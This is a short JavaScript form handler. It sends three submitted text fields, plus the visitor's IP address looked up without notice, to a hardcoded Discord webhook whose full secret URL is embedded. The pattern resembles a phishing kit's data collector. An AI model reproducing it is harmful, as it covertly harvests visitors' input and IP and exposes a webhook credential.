const form = document.getElementById('message-form');

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const message = form.elements.message.value;
  const otherMessage = form.elements.otherMessage.value;
  const additionalMessage = form.elements.additionalMessage.value;

  const ipResponse = await fetch('https://api.ipify.org?format=json');
  const ipData = await ipResponse.json();
  const ipAddress = ipData.ip;

  const webhookUrl = 'https://discord.com/api/webhooks/1213566828614516827/egaSwkvIWhaAd6ND2pvEntg4S9nRAJWlzidq1U2LOPOo153sHpvrrZjdv8tqAqmMISvl';

  const embed = {
    title: 'New Client',
    fields: [
      {
        name: 'Message',
        value: message,
        inline: false
      },
      {
        name: 'Other Message',
        value: otherMessage,
        inline: false
      },
      {
        name: 'Additional Message',
        value: additionalMessage,
        inline: false
      },
      {
        name: 'IP',
        value: ipAddress,
        inline: false
      }
    ]
  };

  const requestBody = {
    embeds: [embed]
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(requestBody)
  }).then(response => {
    if (response.ok) {
      console.log('تم إرسال الرسالة بنجاح!');
    } else {
      console.error(`فشل في إرسال الرسالة. رمز الحالة: ${response.status}`);
    }
  }).catch(error => {
    console.error(`فشل في إرسال الرسالة. رسالة الخطأ: ${error.message}`);
  });

  // مسح حقلي الإدخال بعد تقديم النموذج
  form.elements.message.value = '';
  form.elements.otherMessage.value = '';
  form.elements.additionalMessage.value = '';
});